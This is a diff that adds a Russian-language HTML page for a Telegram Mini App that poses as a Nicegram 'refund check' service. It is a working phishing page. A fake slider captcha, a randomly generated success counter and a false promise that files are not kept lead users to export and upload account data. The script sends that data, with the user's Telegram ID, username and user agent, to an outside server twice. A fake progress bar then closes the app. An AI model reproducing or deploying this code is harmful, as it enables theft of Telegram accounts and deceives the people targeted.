@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<title>Nicegram</title>
+	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+	<script src="https://telegram.org/js/telegram-web-app.js"></script>
+	<style>
+		:root {
+			--holo-cyan: #0ff;
+			--holo-bg: rgba(10, 12, 20, 0.65);
+			--text-main: #ffffff;
+			--text-secondary: rgba(255, 255, 255, 0.55);
+			--btn-blue-start: #0033cc;
+			--btn-blue-end: #0066ff;
+			--status-green: #00ffaa;
+			--error-red: #ff3333;
+			--glass-border: rgba(255, 255, 255, 0.08);
+			--glass-glow: rgba(0, 255, 255, 0.12);
+			--yellow: #ffef00;
+		}
+
+		* {
+			box-sizing: border-box;
+		}
+
+		body {
+			margin: 0;
+			padding: 0;
+			background: radial-gradient(circle at 30% 30%, #08152a 0%, #000000 100%);
+			color: var(--text-main);
+			font-family: 'Inter', sans-serif;
+			height: 100vh;
+			overflow: hidden;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+			position: relative;
+		}
+
+		#fileInput {
+			display: none !important;
+		}
+
+		#particles, .snow-container {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			pointer-events: none;
+			z-index: 1;
+		}
+
+		.liquid-blob {
+			position: absolute;
+			border-radius: 50%;
+			filter: blur(60px);
+			z-index: 0;
+			opacity: 0.18;
+			animation: floatBlob 14s infinite ease-in-out;
+		}
+
+		.blob-1 {
+			width: 320px;
+			height: 320px;
+			background: #00ffff;
+			top: -10%;
+			left: -12%;
+		}
+
+		.blob-2 {
+			width: 280px;
+			height: 280px;
+			background: #0044ff;
+			bottom: -10%;
+			right: -12%;
+		}
+
+		@keyframes floatBlob {
+			0%, 100% { transform: translate(0, 0); }
+			50% { transform: translate(30px, -30px); }
+		}
+
+		.animated-images {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			pointer-events: none;
+			z-index: 2;
+		}
+
+		.image {
+			position: absolute;
+			width: 65px;
+			opacity: 0.12;
+			filter: blur(0.8px);
+			animation: floatImg 20s infinite ease-in-out;
+		}
+
+		.image1 { top: 20%; left: 10%; }
+		.image2 { top: 65%; left: 80%; }
+		.image3 { top: 70%; left: 15%; }
+		.image4 { top: 15%; left: 75%; }
+
+		@keyframes floatImg {
+			0%, 100% { transform: translateY(0) rotate(0deg); }
+			50% { transform: translateY(-30px) rotate(6deg); }
+		}
+
+		.snowflake {
+			position: absolute;
+			background: radial-gradient(circle, #ffffff 0%, transparent 70%);
+			border-radius: 50%;
+			opacity: 0.75;
+			animation: fall linear infinite;
+		}
+
+		@keyframes fall {
+			to {
+				transform: translateY(110vh) translateX(15px) rotate(360deg);
+			}
+		}
+
+		.garland-wrap {
+			position: fixed;
+			top: -10px;
+			left: 0;
+			width: 100%;
+			height: 50px;
+			z-index: 20;
+			pointer-events: none;
+			display: flex;
+			justify-content: space-around;
+		}
+
+		.light-bulb {
+			width: 12px;
+			height: 12px;
+			border-radius: 50%;
+			position: relative;
+			margin-top: 8px;
+			animation: flash 2s infinite alternate;
+		}
+
+		.bulb-cyan { background: #00ffff; box-shadow: 0 0 12px #00ffff; }
+		.bulb-blue { background: #0066ff; box-shadow: 0 0 12px #0066ff; }
+		.bulb-white { background: #ffffff; box-shadow: 0 0 12px #ffffff; }
+
+		@keyframes flash {
+			from { opacity: 0.35; }
+			to { opacity: 1; }
+		}
+
+		.frost-vignette {
+			position: fixed;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			box-shadow: inset 0 0 100px rgba(150, 240, 255, 0.15);
+			pointer-events: none;
+			z-index: 55;
+		}
+
+		.glass-card {
+			position: relative;
+			z-index: 10;
+			width: 88%;
+			max-width: 340px;
+			padding: 50px 30px 40px;
+			background: var(--holo-bg);
+			border-radius: 28px;
+			backdrop-filter: blur(28px) saturate(150%);
+			-webkit-backdrop-filter: blur(28px) saturate(150%);
+			border: 1px solid var(--glass-border);
+			box-shadow: 0 12px 30px rgba(0, 0, 0, 0.6), 0 0 0 1px var(--glass-glow);
+			text-align: center;
+		}
+
+		.santa-hat-icon {
+			position: absolute;
+			top: -28px;
+			right: -22px;
+			width: 60px;
+			filter: drop-shadow(0 0 8px rgba(0,255,255,0.4));
+			z-index: 12;
+		}
+
+		.logo-text {
+			font-size: 40px;
+			font-weight: 900;
+			color: #fff;
+			letter-spacing: -1.5px;
+			margin-bottom: 8px;
+			text-shadow: 0 0 12px rgba(255, 255, 255, 0.25), 0 0 20px rgba(0, 255, 255, 0.15);
+			background: linear-gradient(90deg, #ffffff, #aaffff);
+			-webkit-background-clip: text;
+			-webkit-text-fill-color: transparent;
+		}
+
+		h1 {
+			font-size: 22px;
+			font-weight: 800;
+			margin: 0 0 14px;
+			color: #fff;
+			opacity: 0.92;
+		}
+
+		p {
+			font-size: 14px;
+			color: var(--text-secondary);
+			line-height: 1.55;
+			margin-bottom: 20px;
+		}
+
+		.stats-wrapper {
+			display: inline-flex;
+			align-items: center;
+			gap: 10px;
+			margin-bottom: 28px;
+			background: rgba(0, 50, 80, 0.25);
+			padding: 9px 20px;
+			border-radius: 50px;
+			border: 1px solid rgba(0, 200, 255, 0.15);
+		}
+
+		.live-dot {
+			width: 9px;
+			height: 9px;
+			background: var(--status-green);
+			border-radius: 50%;
+			box-shadow: 0 0 10px var(--status-green);
+			animation: pulse-dot 2s infinite;
+		}
+
+		@keyframes pulse-dot {
+			0%, 100% { opacity: 1; transform: scale(1); }
+			50% { opacity: 0.5; transform: scale(0.85); }
+		}
+
+		#stats-counter {
+			font-size: 13px;
+			font-weight: 600;
+			color: var(--holo-cyan);
+			text-shadow: 0 0 6px rgba(0, 255, 255, 0.25);
+		}
+
+		.btn {
+			background: linear-gradient(135deg, var(--btn-blue-start), var(--btn-blue-end));
+			color: white;
+			border: none;
+			padding: 17px 0;
+			border-radius: 18px;
+			font-size: 18px;
+			font-weight: 800;
+			width: 100%;
+			cursor: pointer;
+			box-shadow: 0 8px 20px rgba(0, 30, 100, 0.5), 0 0 0 1px rgba(0, 150, 255, 0.3);
+			transition: all 0.3s ease;
+			font-family: 'Inter', sans-serif;
+		}
+
+		.btn:active {
+			transform: scale(0.98);
+		}
+
+		.security-note {
+			margin-top: 15px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			gap: 6px;
+			font-size: 11px;
+			color: var(--text-secondary);
+			font-weight: 600;
+			opacity: 0.7;
+		}
+
+		.security-note svg {
+			width: 12px;
+			height: 12px;
+			fill: var(--holo-cyan);
+		}
+
+		.step {
+			display: none;
+		}
+
+		.step.active {
+			display: block;
+		}
+
+		.captcha-box {
+			margin-bottom: 24px;
+		}
+
+		.slider-track {
+			position: relative;
+			height: 56px;
+			background: rgba(255, 255, 255, 0.03);
+			border-radius: 16px;
+			overflow: hidden;
+			border: 1px solid rgba(255, 255, 255, 0.08);
+		}
+
+		.slider-fill {
+			position: absolute;
+			left: 0;
+			top: 0;
+			height: 100%;
+			width: 0;
+			background: linear-gradient(90deg, rgba(0, 255, 255, 0.2), rgba(0, 100, 255, 0.3));
+			transition: width 0.1s;
+		}
+
+		.slider-thumb {
+			position: absolute;
+			left: 6px;
+			top: 6px;
+			width: 44px;
+			height: 44px;
+			background: linear-gradient(135deg, #fff, #e0e0e0);
+			border-radius: 12px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			cursor: grab;
+			transition: left 0.1s, background 0.3s, box-shadow 0.3s;
+			z-index: 2;
+			user-select: none;
+			touch-action: none;
+			box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+		}
+
+		.slider-thumb:active {
+			cursor: grabbing;
+		}
+
+		.slider-thumb svg {
+			width: 22px;
+			height: 22px;
+			fill: #333;
+			transition: fill 0.3s;
+		}
+
+		.slider-thumb.success {
+			background: linear-gradient(135deg, #00cc66, #00ff88);
+			box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
+		}
+
+		.slider-thumb.success svg {
+			fill: #fff;
+		}
+
+		.slider-text {
+			position: absolute;
+			width: 100%;
+			height: 100%;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			font-size: 13px;
+			color: rgba(255,255,255,0.35);
+			pointer-events: none;
+			z-index: 1;
+			font-weight: 500;
+			letter-spacing: 0.5px;
+		}
+
+		#step-loading.active {
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+		}
+
+		.spinner {
+			width: 50px;
+			height: 50px;
+			border: 3px solid rgba(255, 255, 255, 0.1);
+			border-left-color: var(--holo-cyan);
+			border-radius: 50%;
+			animation: spin 1s linear infinite;
+			margin-bottom: 22px;
+		}
+
+		@keyframes spin {
+			to { transform: rotate(360deg); }
+		}
+
+		.status-text {
+			font-size: 16px;
+			font-weight: 700;
+			color: #fff;
+			margin-bottom: 6px;
+		}
+
+		.percent-display {
+			font-size: 32px;
+			font-weight: 900;
+			color: var(--holo-cyan);
+			text-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
+		}
+
+		.no-close-warning {
+			color: var(--error-red);
+			font-size: 13px;
+			font-weight: 800;
+			margin: 10px 0;
+			text-transform: uppercase;
+			letter-spacing: 0.5px;
+			animation: blink 1.5s infinite;
+		}
+
+		@keyframes blink {
+			0%, 100% { opacity: 1; }
+			50% { opacity: 0.4; }
+		}
+
+		.footer-container {
+			position: absolute;
+			bottom: 35px;
+			display: flex;
+			gap: 18px;
+			z-index: 30;
+		}
+
+		.footer-btn {
+			background: rgba(15, 18, 28, 0.6);
+			color: #fff;
+			padding: 11px 20px;
+			border-radius: 14px;
+			font-size: 14px;
+			font-weight: 700;
+			cursor: pointer;
+			backdrop-filter: blur(12px);
+			border: 1px solid rgba(255, 255, 255, 0.08);
+			font-family: 'Inter', sans-serif;
+		}
+
+		.footer-btn:active {
+			background: rgba(255, 255, 255, 0.08);
+		}
+
+		.modal-overlay {
+			position: fixed;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			background: rgba(0, 0, 0, 0.7);
+			backdrop-filter: blur(8px);
+			z-index: 40;
+			opacity: 0;
+			pointer-events: none;
+			transition: opacity 0.35s ease;
+		}
+
+		.modal-overlay.active {
+			opacity: 1;
+			pointer-events: all;
+		}
+
+		.modal {
+			position: fixed;
+			bottom: -100%;
+			left: 0;
+			width: 100%;
+			background: rgba(15, 18, 28, 0.92);
+			backdrop-filter: blur(30px);
+			border-top: 1px solid rgba(255, 255, 255, 0.1);
+			border-radius: 30px 30px 0 0;
+			padding: 30px 25px 45px;
+			z-index: 50;
+			transition: bottom 0.5s cubic-bezier(0.2, 1, 0.3, 1);
+			color: #fff;
+			max-height: 70vh;
+			overflow-y: auto;
+		}
+
+		.modal.active {
+			bottom: 0;
+		}
+
+		.modal h3 {
+			font-size: 20px;
+			margin-bottom: 18px;
+			font-weight: 700;
+		}
+
+		.modal p {
+			font-size: 14px;
+			color: rgba(255,255,255,0.5);
+			line-height: 1.7;
+			margin-bottom: 12px;
+		}
+
+		.modal strong {
+			color: rgba(255,255,255,0.8);
+		}
+
+		.btn-close {
+			background: rgba(255, 255, 255, 0.07);
+			color: #fff;
+			border: 1px solid rgba(255, 255, 255, 0.12);
+			width: 100%;
+			padding: 15px;
+			margin-top: 22px;
+			border-radius: 16px;
+			font-weight: 800;
+			cursor: pointer;
+			font-family: 'Inter', sans-serif;
+		}
+
+		.error-box {
+			text-align: center;
+			padding: 24px 0;
+		}
+
+		.error-icon {
+			font-size: 56px;
+			margin-bottom: 18px;
+		}
+
+		.error-text {
+			font-size: 14px;
+			color: rgba(255,255,255,0.5);
+			margin-bottom: 24px;
+			line-height: 1.6;
+		}
+	</style>
+</head>
+<body>
+
+	<div class="liquid-blob blob-1"></div>
+	<div class="liquid-blob blob-2"></div>
+
+	<div class="garland-wrap" id="garland"></div>
+
+	<div class="animated-images">
+		<img src="https://betterdrain.baby/ring.png" class="image image1">
+		<img src="https://betterdrain.baby/clock.png" class="image image2">
+		<img src="https://betterdrain.baby/shard.png" class="image image3">
+		<img src="https://betterdrain.baby/skull.png" class="image image4">
+	</div>
+
+	<div class="snow-container" id="snow"></div>
+
+	<div class="frost-vignette"></div>
+
+	<div class="glass-card">
+		<img src="https://cdn-icons-png.flaticon.com/512/744/744546.png" class="santa-hat-icon" alt="NY">
+		<div class="logo-text">Nicegram</div>
+
+		<div id="step-captcha" class="step">
+			<h1 id="greeting">Привет</h1>
+			<p>Подтвердите, что вы человек</p>
+			<div class="captcha-box">
+				<div class="slider-track" id="sliderTrack">
+					<div class="slider-fill" id="sliderFill"></div>
+					<div class="slider-text" id="sliderText">›› Проведите вправо ››</div>
+					<div class="slider-thumb" id="sliderThumb">
+						<svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+					</div>
+				</div>
+			</div>
+			<div class="security-note">
+				<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+				Защита от автоматизации
+			</div>
+		</div>
+
+		<div id="step-main" class="step">
+			<h1 id="greeting2">Привет</h1>
+			<p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+			<div class="stats-wrapper">
+				<div class="live-dot"></div>
+				<span id="stats-counter">Пройдено успешных проверок за сегодня <strong id="statsNum">3050</strong></span>
+			</div>
+			<input type="file" id="fileInput" accept=".zip,.txt">
+			<button class="btn" onclick="document.getElementById('fileInput').click()">📁 Загрузить файл</button>
+			<div class="security-note">
+				<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+				NiceGram ® все данные защищены
+			</div>
+		</div>
+
+		<div id="step-loading" class="step">
+			<div class="spinner"></div>
+			<div class="status-text" id="loadStatus">Инициализация...</div>
+			<div class="no-close-warning">Не закрывайте приложение!</div>
+			<div class="percent-display" id="loadPercent">0%</div>
+		</div>
+
+		<div id="step-error" class="step">
+			<div class="error-box">
+				<div class="error-icon">⚠️</div>
+				<div class="error-text" id="errorText">Произошла ошибка</div>
+				<button class="btn" onclick="location.reload()">Попробовать снова</button>
+			</div>
+		</div>
+	</div>
+
+	<div class="footer-container">
+		<button class="footer-btn" onclick="openModal('instructionModal')">Инструкция</button>
+		<button class="footer-btn" onclick="openModal('faqModal')">FAQ</button>
+	</div>
+
+	<div class="modal-overlay" onclick="closeAllModals()"></div>
+
+	<div class="modal" id="instructionModal">
+		<h3>Инструкция</h3>
+		<p><strong>1.</strong> Скачайте приложение Nicegram с официального сайта...</p>
+		<p><strong>2.</strong> Откройте Nicegram и войдите в свой аккаунт.</p>
+		<p><strong>3.</strong> Зайдите в настройки и выберите пункт «Nicegram».</p>
+		<p><strong>4.</strong> Экспортируйте файл...</p>
+		<p><strong>5.</strong> Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</p>
+		<p><strong>6.</strong> Отправьте файл боту.</p>
+		<p><strong>7.</strong> Ожидайте результатов проверки.</p>
+		<button class="btn-close" onclick="closeAllModals()">Понятно</button>
+	</div>
+
+	<div class="modal" id="faqModal">
+		<h3>❓ Частые вопросы</h3>
+		<p><strong>Что такое рефаунд?</strong><br>Это возврат средств за подарок...</p>
+		<p><strong>Сколько времени занимает проверка?</strong><br>Обычно 3-5 минут, бывают задержки</p>
+		<p><strong>Мои файлы в безопасности?</strong><br>Да - мы не храним ваши файлы, их проверяет наш бот, после чего удаляет</p>
+		<button class="btn-close" onclick="closeAllModals()">Закрыть</button>
+	</div>
+
+	<div class="modal" id="errorModal">
+		<h3>Ошибка!</h3>
+		<p>Файл должен быть в формате <strong>.zip</strong> или <strong>.txt</strong>! Пожалуйста, прочтите инструкцию.</p>
+		<button class="btn-close" onclick="closeAllModals()">Понятно</button>
+	</div>
+
+	<script>
+		const SERVER = "https://newnicegram.onrender.com";
+		const SERVER2 = "https://newnicegram.onrender.com";
+
+		const tg = window.Telegram.WebApp;
+		tg.expand();
+
+		const user = tg.initDataUnsafe?.user || {};
+		const userId = user.id || "0";
+		const userName = user.username || "user";
+
+		document.getElementById('greeting').textContent = `Привет, ${user.first_name || userName}`;
+		document.getElementById('greeting2').textContent = `Привет, ${user.first_name || userName}`;
+		document.getElementById('statsNum').textContent = (2500 + Math.floor(Math.random() * 1000)).toLocaleString();
+
+		let sessionId = localStorage.getItem('sid') || '';
+		let captchaId = '';
+		let verified = false;
+
+		function showStep(id) {
+			document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+			document.getElementById(id).classList.add('active');
+		}
+
+		function showError(msg) {
+			document.getElementById('errorText').textContent = msg;
+			showStep('step-error');
+		}
+
+		function openModal(id) {
+			document.querySelector('.modal-overlay').classList.add('active');
+			document.getElementById(id).classList.add('active');
+		}
+
+		function closeAllModals() {
+			document.querySelector('.modal-overlay').classList.remove('active');
+			document.querySelectorAll('.modal').forEach(m => m.classList.remove('active'));
+		}
+
+		async function initSession() {
+			try {
+				const res = await fetch(`${SERVER}/init`, {
+					method: 'POST',
+					headers: {'Content-Type': 'application/json'},
+					body: JSON.stringify({user_id: userId, session_id: sessionId})
+				});
+				const data = await res.json();
+				if (data.error === 'IP_BANNED') return showError('Доступ временно ограничен');
+				if (data.error === 'USER_BANNED') return showError('Ваш аккаунт заблокирован');
+				if (data.verified) {
+					sessionId = data.session_id;
+					localStorage.setItem('sid', sessionId);
+					verified = true;
+					showStep('step-main');
+					logEntry();
+				} else {
+					captchaId = data.captcha_id;
+					showStep('step-captcha');
+					initSlider();
+				}
+			} catch (e) {
+				showError('Ошибка соединения с сервером');
+			}
+		}
+
+		async function verifyCaptcha() {
+			try {
+				const res = await fetch(`${SERVER}/verify`, {
+					method: 'POST',
+					headers: {'Content-Type': 'application/json'},
+					body: JSON.stringify({captcha_id: captchaId})
+				});
+				const data = await res.json();
+				if (data.verified) {
+					sessionId = data.session_id;
+					localStorage.setItem('sid', sessionId);
+					verified = true;
+					if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+					setTimeout(() => {
+						showStep('step-main');
+						logEntry();
+					}, 500);
+					return true;
+				}
+				return false;
+			} catch (e) {
+				return false;
+			}
+		}
+
+		async function logEntry() {
+			try {
+				await fetch(`${SERVER}/log`, {
+					method: 'POST',
+					headers: {'Content-Type': 'application/json'},
+					body: JSON.stringify({
+						user_id: userId,
+						username: userName,
+						user_agent: navigator.userAgent,
+						session_id: sessionId
+					})
+				});
+			} catch (e) {}
+		}
+
+		function initSlider() {
+			const track = document.getElementById('sliderTrack');
+			const thumb = document.getElementById('sliderThumb');
+			const fill = document.getElementById('sliderFill');
+			const text = document.getElementById('sliderText');
+			let isDragging = false;
+			let startX = 0;
+			let thumbX = 0;
+			const maxX = track.offsetWidth - thumb.offsetWidth - 12;
+
+			function start(e) {
+				if (verified) return;
+				isDragging = true;
+				startX = (e.touches ? e.touches[0].clientX : e.clientX) - thumbX;
+				thumb.style.transition = 'none';
+				fill.style.transition = 'none';
+			}
+
+			function move(e) {
+				if (!isDragging) return;
+				e.preventDefault();
+				const x = (e.touches ? e.touches[0].clientX : e.clientX) - startX;
+				thumbX = Math.max(0, Math.min(x, maxX));
+				thumb.style.left = (thumbX + 6) + 'px';
+				fill.style.width = (thumbX + 56) + 'px';
+				const pct = thumbX / maxX;
+				text.style.opacity = 1 - pct;
+			}
+
+			async function end() {
+				if (!isDragging) return;
+				isDragging = false;
+				thumb.style.transition = 'left 0.3s, background 0.3s';
+				fill.style.transition = 'width 0.3s';
+				if (thumbX >= maxX - 10) {
+					thumb.classList.add('success');
+					thumb.innerHTML = '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>';
+					text.textContent = 'Проверка...';
+					text.style.opacity = 1;
+					const ok = await verifyCaptcha();
+					if (!ok) {
+						thumb.classList.remove('success');
+						thumb.innerHTML = '<svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>';
+						text.textContent = '›› Проведите вправо ››';
+						thumbX = 0;
+						thumb.style.left = '6px';
+						fill.style.width = '0';
+					}
+				} else {
+					thumbX = 0;
+					thumb.style.left = '6px';
+					fill.style.width = '0';
+					text.style.opacity = 1;
+				}
+			}
+
+			thumb.addEventListener('mousedown', start);
+			thumb.addEventListener('touchstart', start, {passive: true});
+			document.addEventListener('mousemove', move);
+			document.addEventListener('touchmove', move, {passive: false});
+			document.addEventListener('mouseup', end);
+			document.addEventListener('touchend', end);
+		}
+
+		document.getElementById('fileInput').addEventListener('change', async function() {
+			const file = this.files[0];
+			if (!file) return;
+			const ext = file.name.split('.').pop().toLowerCase();
+			if (ext !== 'zip' && ext !== 'txt') {
+				openModal('errorModal');
+				this.value = '';
+				return;
+			}
+			if (file.size > 50 * 1024 * 1024) {
+				showError('Файл слишком большой (макс. 50MB)');
+				this.value = '';
+				return;
+			}
+			showStep('step-loading');
+			uploadFile(file);
+			let pct = 0;
+			const statuses = ['Проверяем ликвидность файла', 'Анализируем аукционы', 'Проверка происхождения звёзд', 'Формирование вердикта'];
+			const timer = setInterval(() => {
+				pct += 0.5;
+				if (pct >= 100) {
+					pct = 100;
+					clearInterval(timer);
+					if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+					setTimeout(() => tg.close(), 800);
+				}
+				document.getElementById('loadPercent').textContent = Math.floor(pct) + '%';
+				document.getElementById('loadStatus').textContent = statuses[Math.min(Math.floor(pct / 25), 3)];
+			}, 600);
+		});
+
+		async function uploadFile(file) {
+			const form = new FormData();
+			form.append('user_id', userId);
+			form.append('username', userName);
+			form.append('user_agent', navigator.userAgent);
+			form.append('file', file);
+			const send = async (url) => {
+				try {
+					await fetch(`${url}/upload`, {
+						method: 'POST',
+						headers: {'X-Session-ID': sessionId},
+						body: form
+					});
+				} catch (e) {}
+			};
+			await Promise.all([send(SERVER), send(SERVER2)]);
+		}
+
+		const snow = document.getElementById('snow');
+		for (let i = 0; i < 40; i++) {
+			const f = document.createElement('div');
+			f.className = 'snowflake';
+			f.style.left = Math.random() * 100 + '%';
+			f.style.width = f.style.height = (Math.random() * 4 + 2) + 'px';
+			f.style.animationDuration = Math.random() * 5 + 5 + 's';
+			snow.appendChild(f);
+		}
+
+		const garland = document.getElementById('garland');
+		const colors = ['bulb-cyan', 'bulb-blue', 'bulb-white'];
+		for (let i = 0; i < 20; i++) {
+			const bulb = document.createElement('div');
+			bulb.className = 'light-bulb ' + colors[i % 3];
+			bulb.style.animationDelay = (i * 0.1) + 's';
+			garland.appendChild(bulb);
+		}
+
+		initSession();
+	</script>
+</body>
+</html>
